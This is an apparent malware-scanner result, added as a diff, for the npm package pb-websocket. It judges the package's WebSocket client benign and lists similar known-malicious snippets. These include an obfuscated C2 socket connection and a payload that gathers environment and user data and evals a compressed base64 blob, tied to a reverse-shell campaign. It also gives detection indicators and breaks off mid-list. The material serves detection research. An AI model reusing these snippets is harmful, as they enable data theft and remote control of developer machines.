@@ -1,0 +1,1022 @@
+{
+  "package_name": "pb-websocket",
+  "package_version": "0.0.3-0",
+  "label": "benign",
+  "detection_time": "2026-05-26T19:31:39.681523",
+  "status": "success",
+  "selected_files_count": 5,
+  "selected_files": [
+    "package/package.json",
+    "package/src/index.js",
+    "package/.eslintrc.js",
+    "package/src/lib/pomelo-all.js",
+    "package/src/lib/pomelo-client.js"
+  ],
+  "is_malicious": false,
+  "total_files": 5,
+  "malicious_files": 0,
+  "total_slices": 2,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/pb-websocket/0.0.3-0/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/pb-websocket/0.0.3-0/package/src/index.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/pb-websocket/0.0.3-0/package/.eslintrc.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/pb-websocket/0.0.3-0/package/src/lib/pomelo-all.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "pomelo-all_slice_1",
+          "code_snippet": "(function() {\n  var JS_WS_CLIENT_TYPE = 'js-websocket';\n  var JS_WS_CLIENT_VERSION = '0.0.1';\n\n  var Protocol = window.Protocol;\n  var protobuf = window.protobuf;\n  var decodeIO_protobuf = window.decodeIO_protobuf;\n  var decodeIO_encoder = null;\n  var decodeIO_decoder = null;\n  var Package = Protocol.Package;\n  var Message = Protocol.Message;\n  var EventEmitter = window.EventEmitter;\n  var rsa = window.rsa;\n\n  if(typeof(window) != \"undefined\" && typeof(sys) != 'undefined' && sys.localStorage) {\n    window.localStorage = sys.localStorage;\n  }\n\n  var RES_OK = 200;\n  var RES_FAIL = 500;\n  var RES_OLD_CLIENT = 501;\n\n  if (typeof Object.create !== 'function') {\n    Object.create = function (o) {\n      function F() {}\n      F.prototype = o;\n      return new F();\n    };\n  }\n\n  var root = window;\n  var pomelo = Object.create(EventEmitter.prototype); // object extend from object\n  root.pomelo = pomelo;\n  var socket = null;\n  var reqId = 0;\n  var callbacks = {};\n  var handlers = {};\n  //Map from request id to route\n  var routeMap = {};\n  var dict = {};    // route string to code\n  var abbrs = {};   // code to route string\n  var serverProtos = {};\n  var clientProtos = {};\n  var protoVersion = 0;\n\n  var heartbeatInterval = 0;\n  var heartbeatTimeout = 0;\n  var nextHeartbeatTimeout = 0;\n  var gapThreshold = 100;   // heartbeat gap threashold\n  var heartbeatId = null;\n  var heartbeatTimeoutId = null;\n  var handshakeCallback = null;\n\n  var decode = null;\n  var encode = null;\n\n  var reconnect = false;\n  var reconncetTimer = null;\n  var reconnectUrl = null;\n  var reconnectAttempts = 0;\n  var reconnectionDelay = 5000;\n  var DEFAULT_MAX_RECONNECT_ATTEMPTS = 10;\n\n  var useCrypto;\n\n  var handshakeBuffer = {\n    'sys': {\n      type: JS_WS_CLIENT_TYPE,\n      version: JS_WS_CLIENT_VERSION,\n      rsa: {}\n    },\n    'user': {\n    }\n  };\n\n  var initCallback = null;\n\n  pomelo.init = function(params, cb) {\n    initCallback = cb;\n    var host = params.host;\n    var port = params.port;\n\n    encode = params.encode || defaultEncode;\n    decode = params.decode || defaultDecode;\n\n    var url = 'ws://' + host;\n    if(port) {\n      url +=  ':' + port;\n    }\n\n    handshakeBuffer.user = params.user;\n    if(params.encrypt) {\n      useCrypto = true;\n      rsa.generate(1024, \"10001\");\n      var data = {\n        rsa_n: rsa.n.toString(16),\n        rsa_e: rsa.e\n      }\n      handshakeBuffer.sys.rsa = data;\n    }\n    handshakeCallback = params.handshakeCallback;\n    connect(params, url, cb);\n  };\n\n  var defaultDecode = pomelo.decode = function(data) {\n    //probuff decode\n    var msg = Message.decode(data);\n\n    if(msg.id > 0){\n      msg.route = routeMap[msg.id];\n      delete routeMap[msg.id];\n      if(!msg.route){\n        return;\n      }\n    }\n\n    msg.body = deCompose(msg);\n    return msg;\n  };\n\n  var defaultEncode = pomelo.encode = function(reqId, route, msg) {\n    var type = reqId ? Message.TYPE_REQUEST : Message.TYPE_NOTIFY;\n\n    //compress message by protobuf\n    if(protobuf && clientProtos[route]) {\n      msg = protobuf.encode(route, msg);\n    } else if(decodeIO_encoder && decodeIO_encoder.lookup(route)) {\n      var Builder = decodeIO_encoder.build(route);\n      msg = new Builder(msg).encodeNB();\n    } else {\n      msg = Protocol.strencode(JSON.stringify(msg));\n    }\n\n    var compressRoute = 0;\n    if(dict && dict[route]) {\n      route = dict[route];\n      compressRoute = 1;\n    }\n\n    return Message.encode(reqId, type, compressRoute, route, msg);\n  };\n\n  var connect = function(params, url, cb) {\n    console.log('connect to ' + url);\n\n    var params = params || {};\n    var maxReconnectAttempts = params.maxReconnectAttempts || DEFAULT_MAX_RECONNECT_ATTEMPTS;\n    reconnectUrl = url;\n    //Add protobuf version\n    if(window.localStorage && window.localStorage.getItem('protos') && protoVersion === 0) {\n      var protos = JSON.parse(window.localStorage.getItem('protos'));\n\n      protoVersion = protos.version || 0;\n      serverProtos = protos.server || {};\n      clientProtos = protos.client || {};\n\n      if(!!protobuf) {\n        protobuf.init({encoderProtos: clientProtos, decoderProtos: serverProtos});\n      }\n      if(!!decodeIO_protobuf) {\n        decodeIO_encoder = decodeIO_protobuf.loadJson(clientProtos);\n        decodeIO_decoder = decodeIO_protobuf.loadJson(serverProtos);\n      }\n    }\n    //Set protoversion\n    handshakeBuffer.sys.protoVersion = protoVersion;\n\n    var onopen = function(event) {\n      if(!!reconnect) {\n        pomelo.emit('reconnect');\n      }\n      reset();\n      var obj = Package.encode(Package.TYPE_HANDSHAKE, Protocol.strencode(JSON.stringify(handshakeBuffer)));\n      send(obj);\n    };\n    var onmessage = function(event) {\n      processPackage(Package.decode(event.data), cb);\n      // new package arrived, update the heartbeat timeout\n      if(heartbeatTimeout) {\n        nextHeartbeatTimeout = Date.now() + heartbeatTimeout;\n      }\n    };\n    var onerror = function(event) {\n      pomelo.emit('io-error', event);\n      console.error('socket error: ', event);\n    };\n    var onclose = function(event) {\n      pomelo.emit('close',event);\n      pomelo.emit('disconnect', event);\n      console.error('socket close: ', event);\n      if(!!params.reconnect && reconnectAttempts < maxReconnectAttempts) {\n        reconnect = true;\n        reconnectAttempts++;\n        reconncetTimer = setTimeout(function() {\n          connect(params, reconnectUrl, cb);\n        }, reconnectionDelay);\n        reconnectionDelay *= 2;\n      }\n    };\n    socket = new WebSocket(url);\n    socket.binaryType = 'arraybuffer';\n    socket.onopen = onopen;\n    socket.onmessage = onmessage;\n    socket.onerror = onerror;\n    socket.onclose = onclose;\n  };\n\n  pomelo.disconnect = function() {\n    if(socket) {\n      if(socket.disconnect) socket.disconnect();\n      if(socket.close) socket.close();\n      console.log('disconnect');\n      socket = null;\n    }\n\n    if(heartbeatId) {\n      clearTimeout(heartbeatId);\n      heartbeatId = null;\n    }\n    if(heartbeatTimeoutId) {\n      clearTimeout(heartbeatTimeoutId);\n      heartbeatTimeoutId = null;\n    }\n  };\n\n  var reset = function() {\n    reconnect = false;\n    reconnectionDelay = 1000 * 5;\n    reconnectAttempts = 0;\n    clearTimeout(reconncetTimer);\n  };\n\n  pomelo.request = function(route, msg, cb) {\n    if(arguments.length === 2 && typeof msg === 'function') {\n      cb = msg;\n      msg = {};\n    } else {\n      msg = msg || {};\n    }\n    route = route || msg.route;\n    if(!route) {\n      return;\n    }\n\n    reqId++;\n    sendMessage(reqId, route, msg);\n\n    callbacks[reqId] = cb;\n    routeMap[reqId] = route;\n  };\n\n  pomelo.notify = function(route, msg) {\n    msg = msg || {};\n    sendMessage(0, route, msg);\n  };\n\n  var sendMessage = function(reqId, route, msg) {\n    if(useCrypto) {\n      msg = JSON.stringify(msg);\n      var sig = rsa.signString(msg, \"sha256\");\n      msg = JSON.parse(msg);\n      msg['__crypto__'] = sig;\n    }\n\n    if(encode) {\n      msg = encode(reqId, route, msg);\n    }\n\n    var packet = Package.encode(Package.TYPE_DATA, msg);\n    send(packet);\n  };\n\n  var send = function(packet) {\n    socket.send(packet.buffer);\n  };\n\n  var handler = {};\n\n  var heartbeat = function(data) {\n    if(!heartbeatInterval) {\n      // no heartbeat\n      return;\n    }\n\n    var obj = Package.encode(Package.TYPE_HEARTBEAT);\n    if(heartbeatTimeoutId) {\n      clearTimeout(heartbeatTimeoutId);\n      heartbeatTimeoutId = null;\n    }\n\n    if(heartbeatId) {\n      // already in a heartbeat interval\n      return;\n    }\n    heartbeatId = setTimeout(function() {\n      heartbeatId = null;\n      send(obj);\n\n      nextHeartbeatTimeout = Date.now() + heartbeatTimeout;\n      heartbeatTimeoutId = setTimeout(heartbeatTimeoutCb, heartbeatTimeout);\n    }, heartbeatInterval);\n  };\n\n  var heartbeatTimeoutCb = function() {\n    var gap = nextHeartbeatTimeout - Date.now();\n    if(gap > gapThreshold) {\n      heartbeatTimeoutId = setTimeout(heartbeatTimeoutCb, gap);\n    } else {\n      console.error('server heartbeat timeout');\n      pomelo.emit('heartbeat timeout');\n      pomelo.disconnect();\n    }\n  };\n\n  var handshake = function(data) {\n    data = JSON.parse(Protocol.strdecode(data));\n    if(data.code === RES_OLD_CLIENT) {\n      pomelo.emit('error', 'client version not fullfill');\n      return;\n    }\n\n    if(data.code !== RES_OK) {\n      pomelo.emit('error', 'handshake fail');\n      return;\n    }\n\n    handshakeInit(data);\n\n    var obj = Package.encode(Package.TYPE_HANDSHAKE_ACK);\n    send(obj);\n    if(initCallback) {\n      initCallback(socket);\n    }\n  };\n\n  var onData = function(data) {\n    var msg = data;\n    if(decode) {\n      msg = decode(msg);\n    }\n    processMessage(pomelo, msg);\n  };\n\n  var onKick = function(data) {\n    data = JSON.parse(Protocol.strdecode(data));\n    pomelo.emit('onKick', data);\n  };\n\n  handlers[Package.TYPE_HANDSHAKE] = handshake;\n  handlers[Package.TYPE_HEARTBEAT] = heartbeat;\n  handlers[Package.TYPE_DATA] = onData;\n  handlers[Package.TYPE_KICK] = onKick;\n\n  var processPackage = function(msgs) {\n    if(Array.isArray(msgs)) {\n      for(var i=0; i<msgs.length; i++) {\n        var msg = msgs[i];\n        handlers[msg.type](msg.body);\n      }\n    } else {\n      handlers[msgs.type](msgs.body);\n    }\n  };\n\n  var processMessage = function(pomelo, msg) {\n    if(!msg.id) {\n      // server push message\n      pomelo.emit(msg.route, msg.body);\n      return;\n    }\n\n    //if have a id then find the callback function with the request\n    var cb = callbacks[msg.id];\n\n    delete callbacks[msg.id];\n    if(typeof cb !== 'function') {\n      return;\n    }\n\n    cb(msg.body);\n    return;\n  };\n\n  var processMessageBatch = function(pomelo, msgs) {\n    for(var i=0, l=msgs.length; i<l; i++) {\n      processMessage(pomelo, msgs[i]);\n    }\n  };\n\n  var deCompose = function(msg) {\n    var route = msg.route;\n\n    //Decompose route from dict\n    if(msg.compressRoute) {\n      if(!abbrs[route]){\n        return {};\n      }\n\n      route = msg.route = abbrs[route];\n    }\n    if(protobuf && serverProtos[route]) {\n      return protobuf.decode(route, msg.body);\n    } else if(decodeIO_decoder && decodeIO_decoder.lookup(route)) {\n      return decodeIO_decoder.build(route).decode(msg.body);\n    } else {\n      return JSON.parse(Protocol.strdecode(msg.body));\n    }\n\n    return msg;\n  };\n\n  var handshakeInit = function(data) {\n    if(data.sys && data.sys.heartbeat) {\n      heartbeatInterval = data.sys.heartbeat * 1000;   // heartbeat interval\n      heartbeatTimeout = heartbeatInterval * 2;        // max heartbeat timeout\n    } else {\n      heartbeatInterval = 0;\n      heartbeatTimeout = 0;\n    }\n\n    initData(data);\n\n    if(typeof handshakeCallback === 'function') {\n      handshakeCallback(data.user);\n    }\n  };\n\n  //Initilize data used in pomelo client\n  var initData = function(data) {\n    if(!data || !data.sys) {\n      return;\n    }\n    dict = data.sys.dict;\n    var protos = data.sys.protos;\n\n    //Init compress dict\n    if(dict) {\n      dict = dict;\n      abbrs = {};\n\n      for(var route in dict) {\n        abbrs[dict[route]] = route;\n      }\n    }\n\n    //Init protobuf protos\n    if(protos) {\n      protoVersion = protos.version || 0;\n      serverProtos = protos.server || {};\n      clientProtos = protos.client || {};\n\n        //Save protobuf protos to localStorage\n        window.localStorage.setItem('protos', JSON.stringify(protos));\n\n        if(!!protobuf) {\n          protobuf.init({encoderProtos: protos.client, decoderProtos: protos.server});\n        }\n        if(!!decodeIO_protobuf) {\n          decodeIO_encoder = decodeIO_protobuf.loadJson(clientProtos);\n          decodeIO_decoder = decodeIO_protobuf.loadJson(serverProtos);\n        }\n      }\n    };\n\n    module.exports = pomelo;\n  })();",
+          "is_malicious": false,
+          "malice_score": 0.5109845300515493,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code establishes a WebSocket connection to a dynamically constructed URL using the provided host and port, accesses and modifies localStorage to cache protobuf protocol definitions, encodes and decodes messages using protobuf or JSON, optionally signs messages with RSA if encryption is enabled, and sends/receives data over the network using WebSocket APIs. It manages heartbeat messages and reconnection attempts, processes incoming messages by decoding and dispatching them to callbacks or event handlers, and maintains internal state mappings for request IDs and routes. This facilitates real-time client-server communication with potential exposure of user data and cryptographic keys if the handshake or message signing is compromised.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a client-side WebSocket communication library designed for real-time messaging using protobuf encoding and optional RSA-based message signing. It manages connection lifecycle, heartbeat, reconnection, and message dispatching. While it uses cryptographic functions and accesses localStorage, these are standard for secure communication and caching protocol definitions. There is no evidence of obfuscation, covert data exfiltration, environment manipulation, or execution of arbitrary code. The code does not match the key malicious indicators such as obfuscated C2 URLs, eval of decoded payloads, or unsafe WebSocket reuse. Its behavior aligns with legitimate real-time communication clients rather than malware.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_113501_056835_snippet_4",
+              "source_package": "@typescript_eslinter/eslint (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_056835/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5358788371086121,
+              "code_similarity": 0.49452298879623413,
+              "behavior_similarity": 0.57723468542099,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "const { io } = require(\"socket.io-client\");\n\nconst SERVER_URL = decode(\"==QM1ATN6QTNy4iNyIjLxgTMuUzMx8yL6M3d\");\nconst socket = io(SERVER_URL, {\n  reconnection: true,\n  reconnectionAttempts: Infinity,\n  reconnectionDelay: 1000,\n  reconnectionDelayMax: 5000,\n  timeout: 20000,\n});",
+                "code_behavior": "At runtime, the code decodes an obfuscated server URL and establishes a persistent WebSocket connection to a remote command-and-control (C2) server, enabling real-time exfiltration of collected data and remote command execution by the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "Obfuscated C2 communication and persistent WebSocket connections from a linter package are strong indicators of malware, enabling covert data exfiltration and attacker control.",
+                  "violated_expectations": "A linter should not communicate with external servers, especially using obfuscated addresses or persistent sockets.",
+                  "similar_legitimate_use": "WebSocket connections may be used in collaborative development tools, but not in static code analysis plugins.",
+                  "key_indicators": [
+                    "Obfuscated or encoded server URL in code",
+                    "Persistent WebSocket connection to external IP",
+                    "Use of socket.io-client in a linter package"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (upon package execution, after data collection or persistence setup)",
+                  "file_location": "main package entry point (e.g., index.js)",
+                  "required_permissions": [
+                    "network",
+                    "environment_vars",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@typescript_eslinter/eslint",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (43 versions released between Nov 17 and Dec 1)",
+                  "why_malicious": "The package is a typosquatted clone of the legitimate @typescript-eslint/eslint-plugin, designed to compromise developer systems. It exfiltrates sensitive clipboard and keystroke data, establishes persistence via Windows Startup, enables remote command execution through a C2 channel, and disables legitimate ESLint processes. The package employs obfuscation and dependency abuse to evade detection and maximize impact."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious package via typosquatting, mistaking it for the legitimate @typescript-eslint/eslint-plugin.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is executed upon import or runtime as part of the development workflow."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Clipboard and keyboard monitoring is activated to collect sensitive data from the user's system.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive clipboard and keystroke data is stored locally for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Persistence is established by copying a malicious .bat file to the Windows Startup folder.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious payload is automatically executed on every system reboot, maintaining attacker access."
+                  },
+                  {
+                    "step": 4,
+                    "action": "WebSocket connection to an obfuscated C2 server is established for real-time data exfiltration and remote command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker can exfiltrate collected data and issue commands to the compromised system."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Legitimate ESLint process is disabled to prevent detection and interference with the malicious package.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code operates without interference from legitimate code quality tools."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Clipboard or keyboard monitoring in npm packages not related to accessibility or input management",
+                    "Copying or writing files to the Windows Startup folder from npm package code",
+                    "Obfuscated or dynamically decoded C2 server addresses in JavaScript code",
+                    "Persistent WebSocket connections to external IPs or domains from development tools",
+                    "Execution of shell commands to disable or delete legitimate development tool processes (e.g., ESLint)"
+                  ],
+                  "file_indicators": [
+                    "prettier.bat in Windows Startup folder",
+                    "Unexpected .bat files in npm package tools directory",
+                    "Presence of clipboard-event or node-global-key-listener in package.json dependencies",
+                    "References to socket.io-client in linter plugin dependencies"
+                  ],
+                  "network_indicators": [
+                    "WebSocket connections to ws://135.181.226.254:5051 or similar Hetzner Online GmbH IPs",
+                    "Outbound connections to obfuscated or base64-encoded server URLs in code",
+                    "Unusual persistent network activity from static analysis or linter plugins"
+                  ],
+                  "how_to_detect": "Monitor npm packages for access to clipboard or keyboard events, especially in packages not related to accessibility. Flag packages that copy or write files to system startup folders or establish persistent WebSocket connections to external IPs. Scan for obfuscated or encoded server addresses and unexpected dependencies such as clipboard-event, node-global-key-listener, or socket.io-client in code analysis. Alert on the presence of .bat files in package directories or the Windows Startup folder after npm install, and monitor for shell commands targeting legitimate development tool processes."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5094689726829529,
+              "code_similarity": 0.5899301171302795,
+              "behavior_similarity": 0.4290078282356262,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113217_475177_snippet_1",
+              "source_package": "Apache Tomcat (N/A (Java application server, distributed via official website and package repositories))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113217_475177/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4918128252029419,
+              "code_similarity": 0.42767953872680664,
+              "behavior_similarity": 0.5559461116790771,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode representing the vulnerable logic\nif (websocket.sendMessage() && websocket.isClosing()) {\n    // Error handling triggers\n    objectPool.returnObject(websocket); // WebSocket object returned to pool\n}\n// Later, a new connection retrieves the same object\nWebSocket reusedWebSocket = objectPool.borrowObject();",
+                "code_behavior": "At runtime, when a WebSocket message is sent concurrently with the connection closing, the error handling logic returns the WebSocket object to the pool without proper cleanup, allowing a subsequent connection to borrow the same object with residual state, resulting in sensitive data from one user session being accessible in another session.",
+                "malice_analysis": {
+                  "why_suspicious": "This behavior is suspicious because it enables the exposure of sensitive data from one user's session to another user by reusing WebSocket objects that have not been properly reset or cleaned up, directly violating session isolation and confidentiality guarantees.",
+                  "violated_expectations": "Normally, WebSocket objects should be fully closed and all session-specific state cleared before being returned to the object pool, ensuring that no residual data or state is accessible to subsequent users. The actual behavior allows object reuse with leftover state, leading to unintended data leakage between sessions.",
+                  "similar_legitimate_use": "Object pooling is a legitimate performance optimization technique, but only when pooled objects are thoroughly reset and isolated between uses. In secure implementations, session-specific data is always cleared before reuse.",
+                  "key_indicators": [
+                    "WebSocket object returned to pool while still in use or not fully closed",
+                    "Subsequent connections reusing pooled WebSocket objects with residual state",
+                    "Presence of session data from one user in another user's WebSocket session",
+                    "Concurrent send and close operations on the same WebSocket object"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, during concurrent WebSocket message send and connection close events",
+                  "file_location": "Tomcat WebSocket implementation (Java server-side code, internal object pool management)",
+                  "required_permissions": [
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Apache Tomcat",
+                  "package_manager": "N/A (Java application server, distributed via official website and package repositories)",
+                  "package_versions": "9.0.0.M1 to 9.0.20, 8.5.0 to 8.5.75",
+                  "why_malicious": "The affected versions of Apache Tomcat contain a vulnerability (CVE-2022-25762) in the WebSocket implementation that allows sensitive data from one user session to be exposed to another user, violating confidentiality. This occurs due to improper object pooling and error handling, where pooled WebSocket objects may be reused across connections without proper cleanup, leading to data leakage between sessions."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker sends a WebSocket message at the precise moment the connection is closing, triggering the vulnerable error handling logic.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "WebSocket object is returned to the pool in an unsafe state, potentially retaining session data."
+                  },
+                  {
+                    "step": 2,
+                    "action": "A new user (User B) establishes a WebSocket connection, which borrows the same pooled object that was not properly cleaned.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Residual data from the previous session (User A) is accessible in User B's session, or vice versa."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker receives data intended for another user, or another user receives data from the attacker's session, resulting in information disclosure.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Confidentiality breach; attacker or unintended user gains access to sensitive data from another session."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Concurrent WebSocket message send and connection close events in Tomcat logs",
+                    "Unexpected reuse of WebSocket objects across different user sessions (e.g., same object ID or memory address in multiple sessions)",
